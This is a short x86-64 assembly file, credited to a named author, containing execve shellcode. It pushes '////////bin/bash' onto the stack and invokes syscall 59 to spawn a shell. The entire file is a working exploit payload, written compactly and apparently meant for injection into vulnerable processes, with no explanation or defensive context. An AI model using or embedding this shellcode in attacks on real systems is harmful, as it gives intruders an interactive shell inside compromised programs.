; author Chase Hatch

section .text
global _start
_start:
	xor rax, rax
	push rax
	push rsp
	pop rdx
	mov rbx, qword 0x687361622f6e6962 	;  hsab/nib 
	push rbx
	mov rbx, qword 0x2f2f2f2f2f2f2f2f 	;  ////////
	push rbx
	push rsp
	pop rdi
	push rax
	push rdi
	push rsp
	pop rsi
	mov al, 59 	;execve
	syscall
